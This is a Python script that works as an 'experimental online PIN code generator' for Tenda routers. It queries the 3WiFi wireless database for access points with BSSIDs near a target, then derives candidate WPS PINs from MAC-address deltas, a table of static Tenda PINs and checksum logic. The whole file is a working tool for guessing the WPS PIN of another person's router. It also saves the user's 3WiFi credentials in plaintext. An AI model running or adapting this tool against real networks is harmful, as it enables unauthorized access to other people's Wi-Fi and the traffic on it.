# -*- coding: utf-8 -*-
import argparse
from collections import OrderedDict
import json

try:
    import py3wifi
except ImportError:
    print('''The script needs py3wifi module\n
Please install with:\npip3 install py3wifi\nor\n
pip install py3wifi
''')
    exit(1)
try:
    import WPSpin
except ImportError:
    print('''The script needs WPSpin.py module\n
Make sure the WPSpin.py file is in the current directory''')
    exit(1)


# Tenda's DeltaMAC -> DeltaPINs hashmap
# DeltaPINs are sorted by frequency
deltas_table = {int(k): v for k, v in json.load(open('tenda_deltas.json', encoding='utf-8')).items()}
max_bssid_distance = max(deltas_table)


def mac2dec(mac):
    mac = mac.replace(':', '')
    return int(mac, 16)


def dec2mac(mac):
    mac = hex(mac).split('x')[-1].upper()
    mac = mac.zfill(12)
    for pos in range(10, 0, -2):
        mac = mac[:pos] + ':' + mac[pos:]
    return mac


def incMAC(mac, value):
    '''Increments MAC address'''
    mac = mac2dec(mac) + value
    return dec2mac(mac)


def containsAlgo(t_mac, wps_pin, pinGen):
    '''Checks if a WPS PIN is generated according to a known algorithm'''
    common_static = ('00000000', '12345670', '12345678')
    tenda_static = ('03436080', '03436165', '03974247', '06966409',
                    '09278325', '19967899', '25086164', '25563818',
                    '25777390', '27334737', '35806691', '45304347', '50542208',
                    '63410372', '63491838', '71294988', '74250226')
    if (wps_pin in common_static) or (wps_pin in tenda_static):
        return 'Static PIN: {}'.format(wps_pin)
    mac_list = [t_mac, incMAC(t_mac, -1), incMAC(t_mac, +1)]
    for mac in mac_list:
        wpsPins = pinGen.getAll(mac=mac, get_static=False)
        for item in wpsPins:
            if item['pin'] == wps_pin:
                return item['name']
    return False


def subMAC(mac1, mac2):
    """Substracts the first MAC the second MAC"""
    mac1, mac2 = mac2dec(mac1), mac2dec(mac2)
    return mac1 - mac2


def createParser():
    parser = argparse.ArgumentParser(
        description='''Experimental online PIN code generator
        for some Tenda devices.
        Uses 3WiFi Wireless Database to get anchor points.'''
        )
    parser.add_argument(
        'bssid',
        nargs='?',
        type=str,
        help='the target BSSID'
        )
    parser.add_argument(
        '-i',
        '--ignore-pin',
        action='store_const',
        const=True,
        help='ignore if pin to BSSID is found in 3WiFi'
        )
    parser.add_argument(
        '-a',
        '--anchors',
        type=int,
        default=0,
        help='maximum number of anchor BSSIDs used for the search PINs \
        Default: unlimited'
        )

    return parser


if __name__ == '__main__':
    parser = createParser()
    namespace = parser.parse_args()

    try:
        with open('account.txt', 'r', encoding='utf-8') as file:
            login, password = file.read().strip().split(':')
    except FileNotFoundError:
        print('You need to log in to 3WiFi')
        login = input('Username: ')
        password = input('Password: ')
        try:
            client = py3wifi.Client(login=login, password=password)
            client.auth()
        except py3wifi.exceptions.AuthError:
            print('Authorization failed. Please check username and password.')
            exit(1)
        else:
            with open('account.txt', 'w', encoding='utf-8') as file:
                file.write('{}:{}'.format(login, password))
            print('The credentials were written to account.txt')
    else:
        try:
            client = py3wifi.Client(login=login, password=password)
            client.auth()
        except py3wifi.exceptions.AuthError:
            print('Authorization failed. Please check username and password.')
            exit(1)
    print('Authorization is successful')

    if namespace.bssid:
        target_bssid = namespace.bssid
    else:
        target_bssid = input('Please specify the BSSID: ')
    target_bssid = target_bssid.upper()

    # Generating a mask: 11:22:33:44:55:66 -> 11:22:33:44:5*
    mask = ':'.join(target_bssid.split(':')[:-1])[:-1] + '*'
    print('[*] Requesting 3WiFi for "{}"…'.format(mask))
    res = client.request('find', {'bssid': mask, 'wps': '□□□□□□□□'})['data']
    if not res:
        print('[-] Not found similar BSSIDs in the 3WiFi')
        exit(1)
    print('[+] Found {} records'.format(len(res)))

    # Filtering and processing 3WiFi data
    pinGen = WPSpin.WPSpin()
    data = {}
    for item in res:
        bssid = item['bssid']
        pin = item['wps']
        if (not namespace.ignore_pin) and (bssid == target_bssid):
            print('The PIN for {} was found in 3WiFi: {}'.format(
                target_bssid, pin)
            )
            exit(0)
        if not containsAlgo(bssid, pin, pinGen) and (bssid not in data):
            data[bssid] = int(pin[:-1])

    # Dictionary of deltaMAC as key and BSSID/PIN as value
    distances = {}

    # Calculating all deltaMACs
    for bssid, pin in data.items():
        distance = subMAC(bssid, target_bssid)
        if (distance != 0) and (distance not in distances) \
                and (abs(distance) <= max_bssid_distance):
            distances[distance] = {'bssid': bssid, 'pin': pin}

    # Sorting deltaMACs as absolutely values
    if distances:
        distances = OrderedDict(
            sorted(distances.items(), key=lambda x: abs(x[0]))
            )
        print('[+] {} anchor points defined'.format(len(distances)))
    else:
        print('[-] Not found anchor points')

    pins = OrderedDict()
    anchor_cnt = 0
    for deltaMac, value in distances.items():
        bssid = value['bssid']
        pin = value['pin']
        temp_pins = []
        if abs(deltaMac) not in deltas_table:
            continue
        for deltaPin in deltas_table[abs(deltaMac)]:
            if deltaMac > 0:
                rest_pin = pin - deltaPin
            else:
                rest_pin = pin + deltaPin
            rest_pin %= int(1e7)
            rest_pin = (str(rest_pin) + str(pinGen.checksum(rest_pin))).zfill(8)
            temp_pins.append(rest_pin)
        pins[bssid] = {'pins': temp_pins, 'distance': deltaMac}
        if namespace.anchors != 0:
            anchor_cnt += 1
            if anchor_cnt == namespace.anchors:
                break

    for bssid, value in pins.items():
        pin_list = value['pins']
        distance = value['distance']
        if pin_list:
            print('\nPINs generated with {} (distance: {}; count: {}):'.format(
                bssid, distance, len(pin_list)))
            counter = 1
            for pin in pin_list:
                # Pretty printing
                space = ' ' * (4-len(str(counter)))
                print('{}){}{}'.format(counter, space, pin))
                counter += 1
